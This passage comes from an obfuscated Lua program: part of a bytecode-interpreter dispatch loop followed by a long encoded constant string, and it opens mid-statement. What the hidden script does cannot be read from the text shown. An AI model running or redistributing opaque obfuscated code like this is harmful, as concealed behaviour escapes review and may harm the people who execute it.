a;w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 315>=z then local a;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))elseif 316<z then w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;else local a=y[870];local c=w[y[312]];w[a+1]=c;w[a]=c[y[716]];end;elseif z<=320 then if 318>=z then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=false;n=n+1;y=f[n];a=y[870]w[a](w[a+1])elseif 320~=z then local a;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];n=y[312];end;elseif 321>=z then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end elseif z>322 then local a;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))else local a;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 329>=z then if z<=326 then if z<=324 then if(w[y[870]]~=y[716])then n=y[312];else n=n+1;end;elseif 325<z then w[y[870]]=y[312];else local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end end;elseif z<=327 then local a=y[870]w[a](r(w,a+1,p))elseif 328<z then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];a=y[870]w[a](r(w,a+1,y[312]))else w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];end;elseif z<=332 then if z<=330 then local a,c,e,i=0 while true do if a<=9 then if a<=4 then if a<=1 then if a~=1 then c=nil else e=nil end else if a<=2 then i=nil else if 3<a then n=n+1;else w[y[870]]=h[y[312]];end end end else if a<=6 then if 6~=a then y=f[n];else w[y[870]]=h[y[312]];end else if a<=7 then n=n+1;else if a~=9 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end end end else if a<=14 then if a<=11 then if 11>a then n=n+1;else y=f[n];end else if a<=12 then w[y[870]]=w[y[312]][w[y[716]]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if 16~=a then i=y[870]else e={w[i](w[i+1])};end else if a<=17 then c=0;else if 19>a then for q=i,y[716]do c=c+1;w[q]=e[c];end else break end end end end end a=a+1 end elseif z~=332 then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end else local a;w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 333>=z then local a;local c;local e;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];e=y[870]c={w[e](w[e+1])};a=0;for i=e,y[716]do a=a+1;w[i]=c[a];end elseif z>334 then local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];e=y[312];c=y[716];a=k(w,g,e,c);w[y[870]]=a;else local a;local c;local e;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];e=y[312];c=y[716];a=k(w,g,e,c);w[y[870]]=a;end;elseif 359>=z then if z<=347 then if 341>=z then if 338>=z then if z<=336 then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];n=y[312];elseif 337==z then w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];if(w[y[870]]~=y[716])then n=n+1;else n=y[312];end;else w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];end;elseif z<=339 then local a=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then w={};else for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;end else if a<=2 then n=n+1;else if 4>a then y=f[n];else w[y[870]]=y[312];end end end else if a<=6 then if 6~=a then n=n+1;else y=f[n];end else if a<=7 then w[y[870]]=h[y[312]];else if 8<a then y=f[n];else n=n+1;end end end end else if a<=14 then if a<=11 then if a<11 then w[y[870]]=h[y[312]];else n=n+1;end else if a<=12 then y=f[n];else if a>13 then n=n+1;else w[y[870]]=w[y[312]][y[716]];end end end else if a<=17 then if a<=15 then y=f[n];else if a>16 then n=n+1;else w[y[870]]=w[y[312]][w[y[716]]];end end else if a<=18 then y=f[n];else if a==19 then if(w[y[870]]~=y[716])then n=n+1;else n=y[312];end;else break end end end end end a=a+1 end elseif z<341 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))else local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]]*y[716];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]]+w[y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 344>=z then if(342>=z)then w[y[870]]=(w[y[312]]+y[716]);elseif(344~=z)then local a=y[870]local c={w[a](w[a+1])};local e=0;for i=a,y[716]do e=e+1;w[i]=c[e];end else local a=y[870]w[a]=w[a](w[(a+1)])end;elseif 345>=z then local a,c,e,i=0 while true do if a<=9 then if a<=4 then if a<=1 then if 1~=a then c=nil else e=nil end else if a<=2 then i=nil else if 4~=a then w[y[870]]=h[y[312]];else n=n+1;end end end else if a<=6 then if 5==a then y=f[n];else w[y[870]]=h[y[312]];end else if a<=7 then n=n+1;else if a>8 then w[y[870]]=w[y[312]][y[716]];else y=f[n];end end end end else if a<=14 then if a<=11 then if 11>a then n=n+1;else y=f[n];end else if a<=12 then w[y[870]]=w[y[312]][w[y[716]]];else if a~=14 then n=n+1;else y=f[n];end end end else if a<=16 then if 16~=a then i=y[870]else e={w[i](w[i+1])};end else if a<=17 then c=0;else if a>18 then break else for q=i,y[716]do c=c+1;w[q]=e[c];end end end end end end a=a+1 end elseif 346<z then w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];if w[y[870]]then n=n+1;else n=y[312];end;else w[y[870]]=w[y[312]]+w[y[716]];end;elseif z<=353 then if 350>=z then if z<=348 then local a;local c;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={r({},1,y[312])};n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];c=y[870];a=w[c];for e=c+1,y[312]do t(a,w[e])end;elseif 350~=z then if(y[870]<=w[y[716]])then n=n+1;else n=y[312];end;else local a;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif z<=351 then local a;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](w[a+1])elseif 352==z then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))else local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=false;n=n+1;y=f[n];a=y[870]w[a](w[a+1])end;elseif z<=356 then if 354>=z then local a=y[870];local c=w[a];for e=a+1,y[312]do t(c,w[e])end;elseif z>355 then local a=d[y[312]];local c={};local d={};for e=1,y[716]do n=n+1;local i=f[n];if i[119]==165 then d[e-1]={w,i[312]};else d[e-1]={h,i[312]};end;v[#v+1]=d;end;m(c,{['\95\95\105\110\100\101\120']=function(e,e)local e=d[e];return e[1][e[2]];end,['\95\95\110\101\119\105\110\100\101\120']=function(e,e,i)local d=d[e]d[1][d[2]]=i;end;});w[y[870]]=b(a,c,j);else w[y[870]]=y[312]*w[y[716]];end;elseif z<=357 then j[y[312]]=w[y[870]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];elseif 359~=z then local a;w[y[870]]=j[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](w[a+1])else w[y[870]][y[312]]=y[716];end;elseif z<=371 then if z<=365 then if 362>=z then if z<=360 then local a;local c;local d;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];d=y[870]c={w[d](w[d+1])};a=0;for e=d,y[716]do a=a+1;w[e]=c[a];end elseif 362~=z then if(w[y[870]]~=w[y[716]])then n=y[312];else n=n+1;end;else local a;local c;local d;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];d=y[870]c={w[d](w[d+1])};a=0;for e=d,y[716]do a=a+1;w[e]=c[a];end end;elseif z<=363 then local a=y[870]w[a]=w[a](r(w,a+1,p))elseif z==364 then local a=y[312];local c=y[716];local a=k(w,g,a,c);w[y[870]]=a;else local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))end;elseif 368>=z then if z<=366 then local a;w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))elseif z==367 then local a;w={};for c=0,u,1 do if c<o then w[c]=s[c+1];else break;end;end;n=n+1;y=f[n];w[y[870]]=false;n=n+1;y=f[n];w[y[870]]=j[y[312]];n=n+1;y=f[n];for c=y[870],y[312],1 do w[c]=nil;end;n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];a=y[870]w[a]=w[a](w[a+1])else w[y[870]][y[312]]=y[716];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];end;elseif z<=369 then local a;local c;w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]={};n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]][y[312]]=w[y[716]];n=n+1;y=f[n];w[y[870]]={r({},1,y[312])};n=n+1;y=f[n];w[y[870]]=w[y[312]];n=n+1;y=f[n];c=y[870];a=w[c];for d=c+1,y[312]do t(a,w[d])end;elseif 371>z then local a=y[870];local c,d,e=w[a],w[a+1],w[a+2];local c=c+e;w[a]=c;if e>0 and c<=d or e<0 and c>=d then n=y[312];w[a+3]=c;end;else w={};for a=0,u,1 do if a<o then w[a]=s[a+1];else break;end;end;end;elseif z<=377 then if 374>=z then if 372>=z then local a=0 while true do if a<=6 then if a<=2 then if a<=0 then w[y[870]]=w[y[312]][y[716]];else if a~=2 then n=n+1;else y=f[n];end end else if a<=4 then if 3==a then w[y[870]]=w[y[312]][y[716]];else n=n+1;end else if 5<a then w[y[870]]=w[y[312]][y[716]];else y=f[n];end end end else if a<=9 then if a<=7 then n=n+1;else if a==8 then y=f[n];else w[y[870]]=w[y[312]][y[716]];end end else if a<=11 then if 10==a then n=n+1;else y=f[n];end else if a<13 then w[y[870]]=w[y[312]][w[y[716]]];else break end end end end a=a+1 end elseif z<374 then if not w[y[870]]then n=n+1;else n=y[312];end;else w[y[870]]();end;elseif z<=375 then local a;local c;local d;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];d=y[312];c=y[716];a=k(w,g,d,c);w[y[870]]=a;elseif z<377 then local a=y[870]local c={w[a](r(w,a+1,p))};local d=0;for e=a,y[716]do d=d+1;w[e]=c[d];end else local a=y[870];do return r(w,a,p)end;end;elseif z<=380 then if z<=378 then local a=y[870]w[a](w[a+1])elseif 379<z then local a;w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];w[y[870]]=y[312];n=n+1;y=f[n];a=y[870]w[a]=w[a](r(w,a+1,y[312]))else if(w[y[870]]~=y[716])then n=y[312];else n=n+1;end;end;elseif 382>=z then if not(381~=z)then w[y[870]]=(w[y[312]]*y[716]);else local a,c=0 while true do if a<=16 then if a<=7 then if a<=3 then if a<=1 then if a==0 then c=nil else w[y[870]]=w[y[312]][y[716]];end else if a>2 then y=f[n];else n=n+1;end end else if a<=5 then if 5>a then w[y[870]]=h[y[312]];else n=n+1;end else if 6<a then w[y[870]]=w[y[312]][y[716]];else y=f[n];end end end else if a<=11 then if a<=9 then if 9~=a then n=n+1;else y=f[n];end else if 11>a then w[y[870]]={};else n=n+1;end end else if a<=13 then if a~=13 then y=f[n];else w[y[870]]=h[y[312]];end else if a<=14 then n=n+1;else if a>15 then w[y[870]]=w[y[312]][y[716]];else y=f[n];end end end end end else if a<=24 then if a<=20 then if a<=18 then if a>17 then y=f[n];else n=n+1;end else if a~=20 then w[y[870]]=h[y[312]];else n=n+1;end end else if a<=22 then if 22>a then y=f[n];else w[y[870]]={};end else if a==23 then n=n+1;else y=f[n];end end end else if a<=28 then if a<=26 then if 25==a then w[y[870]]=h[y[312]];else n=n+1;end else if 27<a then w[y[870]]=w[y[312]][y[716]];else y=f[n];end end else if a<=30 then if a~=30 then n=n+1;else y=f[n];end else if a<=31 then c=y[870]else if a<33 then w[c]=w[c]()else break end end end end end end a=a+1 end end;elseif 383<z then local a;local c;local d;w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][w[y[716]]];n=n+1;y=f[n];w[y[870]]=h[y[312]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];w[y[870]]=w[y[312]][y[716]];n=n+1;y=f[n];d=y[312];c=y[716];a=k(w,g,d,c);w[y[870]]=a;else if(w[y[870]]<=w[y[716]])then n=n+1;else n=y[312];end;end;n=n+1;end;end;end;return b(cr(),{},l())();end)('24026W25026W24Q22X22W22W27927A27D27D23127D1O1Q11161S22W27G27A1S191A141D22W23227D1B17161B1927M27W27A1R1S27J161F22W23027X10191Q28B27D152821022W22Y27D171R27N27D1C1D1A1T28A28C27P191R1322W22P27X171Q171T1S27K27U28Y22W1E27K1C22W23327D1F1D1S1E1D161U27V27D1T161O191B29227O22W1O281141429I29K29M27K1E1728H27A2A92AB22S27D1R29M1529M28227R27T22W22Z27D1Q1D1O2AP2AH1T1A28R27A28J1S1B28L22O27D1S28P28727K28A28422W27K2AI1Q27M29D1F1R2AX27B27D25927C27E21E21422W28L27A25622F21W25021U22224R24I21O26W21Q22424D1121H25826M26O24Q23821B24523N24J24524521M23J26B22221829H21O21T1521826G25824123H23423024K22R24U25N21X1J1Y24321L25222A24Q1F22925R1S23T23U1R23T24N24924P1U22F24123P26E25925F22E24X23B26N1322P21F24T23U23N25M24X26V1P23G22G21C21G24426F1822A23Q26121A23A24C25R26P23O24A2AC22W25Y1Y21125D2BM27A25Y2EX22W26H2F025L2AV27A2691K1P2F026X2F02642F522W24F21F29J29D2641Y21625Z22W22R27D26Q1Z21C25G1H21B26125W22D24B22J22W22V27D26M21E21O25C111Y25M25Y23324D22421M26S22Q22822W23D27D26N2101X2441421K25E25J22A24C2251O26Q22U22A25S23V22W23H27D26G21E21326321A21126123M22224122521L27023121Y26G23L24725P1O22222W22Q27D27021K21I25Z2131C2GT22824C22W2342HU21121925T21821A26023M23J24722A1Z26N22A22H25X23U24526021J21S26X26K25T2AZ22W26L21R21925C21322W21L27D25U2FS25G21D23423O23X22624922122Q26Y22W21T25W24B2422671722226F26825O26Z26922N1H24722S22722R151J1J22S21U23W25V270214131925Y21D25R24Y22Y21V22826Y22725Z21225R21V1S23Y22B25424L23A26G25Q26V23Q22X21R26W26P23N25T24Q21125H1I23V2191D21Y25O22W2AG27A26C23621J24E22Y22S23Q23V1P23V1K27A28N27A24F22U22W23I27D26O141B26Y22Q21A25Q25D22B24C22F1Y26Y1X22B26523R2EM1G1L2512H42FQ131G26C22Q21K25Q25V22124D22521K25922V22C25X23M24525Q22628A27E2A627A26G21I21P2701Z2182IT2BC26Q21K2152652132J22A026T1W21625T21C2N622W26X21K1B25F2182FW2FO27D26I2I725E1Z21Q25Q26Q22823X2252NS2O22192O42O622W22T27D23L21O21926021A22Y25R25J22I2492231W2F22B527A26Q1Y21525X21821125E25I2I427D26S21K22S25S21321825M25Z22823W1U21O26P22O22426124C25S25O1R22I26Z26F23M2OH2OJ2OL2ON22Y26325S22D23Y22N21K26W2P727A2P922S25G21C1Z26525F22024D2PJ2PL2PN2PP2PR2PT2PV2GK2PY2OM2OO2Q22Q42Q626W23522H25L24D22W2352P82PA2QD2QF2QH24D1L23026L23122C25H23V23M23U1I21S26826L25J2502PX27A2OK2QT22Y25K25P22B23Z22821526N2Q922W2QB25Z21921126425O22H23U2QK2PM2PO2PQ2PS2PU2PW2FP2RR2PZ2OO25G25X22A2GE2LV2R522S26321H21025Q25S1S23S22A21926C22S21Z24C23S24F2671Q2232RP2LD22W2RS2Q025F25P22924122J21R22W23J2SS2642192132GT2272602261W27023C22825Q25Q24625H1121T26P24I2RQ2TE1X2172652122OP2OR2OT2OV22W23C2FQ2P02P22P425I23224722921K25P22O21Z25K2U923L2UB2UD2Q12Q32Q52Q72QR2RR2V02UE2QV2V42QY2R02R22OI2V72UC2UE2RV2RX2RZ2S12SJ2UA2VH22Y2SN2SP2242LC2OJ2V822Y2TH2TJ2TL2UY2OL25Z2152UF2OS2OU2F221V27D26B21K21D24421421R26025Y1S24F2US25922Y22K26723P2N122C22126F26K25Q25126922A1Q25F21922522P29M21P2111M24C25Q2721H1S22E2W12192W32V22QW2V52GL2SK2XG2W42VA2QX2QZ2R12XF2XH2VJ2RY2S02O02XM2XH2VR2SQ2TD2RS2XH2VY2TK2TM2Y321H2112622M225Q25G22L23X22A21K22W182WA2WC2442162UC25J1S24A22J21526R1X21T26123N23K25H1622626F26I25R26K25122G1U23X21022122W21Y28722F22123P26526W1J1P1225F21V25O24Q21721F21Y26E2232KJ25F22O21R26T21O25924Z21925523R26M25O23F21O26A24L25W24D24N21J25K1425R21I21T22J25E27326P25524125I1W22K21H22H22I2692432311X24M2HS27D24A2GO2S521025R25T1S24L2VU2RR2YA2YC21M26125N2222492222152UJ2OJ311I22Q311K311M311O2152RD21S25R311G2TE311T21525G25P22324622J21Q3116311H2YB22Q2S72S923U2XY3123312E1Y25G25R22D2MT22W2LU2RR21N21725Y1W21F23V25I22H24E22N21L26P2392V622W2H721G2602172152GB22H24C23121K26Q23722C2632H329J27A26021E1W25F1Z21K2602U926X21N2I821821Q26B25F2GV22A2XX2G327A2G521425T21E2HC2EZ2472361Z27322R2VT312S2TE312U312W312Y25U22624122021926H2AG23E2OJ314O312X23V314R314T314V22S21X25S24B23N312R314Z312V31512M52472211Y26W237312223L3150312Y31273129312B2VF314N315D312Y25M22B24522F21526M313723L21021825D21I21A2VR26022I21526Z22O21S25S2EQ2XL2TE3164316631682SO2TV21Q26S23B22C25K2H32H52RR316K31673169226316P316R316T23K25I1122K3162316X316M22A26022L1Z26Q23A22J2PO2G22OJ3179316922921N26R2T4311R316W3165316Y316N22E1Z26O22W22831212UK312T21125V1W21725K25L1S24C22J21627023822H2UX3182314N3184318631882SZ22421126J22O2YY22W23G314Z318K3187318923S318O318Q2YY24E24C2JL317R318J3185318X1S24B2291Z26I2332U0315B31833198318M315G315I315K31483197318L31892402291X26S22S21Y22W23F2OJ21F1X25J21I21K25G26322924922623026X22S2MC24B24C26622W2OX22W26W21I21J25T1I2172612EZ319Z2RR31A131A331A531A731A92RC23722K25M23Z23O31212TO31AU31A231A431A631A831AA26L31B131B331B51421V268317Y31AT2TE31AV31BA31AY31AA27223222I25N23K2IN316231BO31AX31BC230317F317H2I3314Y31B831AW31BB31AZ26T23222G25X23V315A318I23L1Z21I2HA2122SX318A318C318E318G22W1Y2J32J52J72J92JB2JD2JF2JH2JJ2JL2JN2JP2JR2JT2JV2JX2JZ2K12K32K52K72K92KB2KD22822527222C25Z21O25Q23G23I24I23H26826C21G27125X26U25H23621I26U26825K25T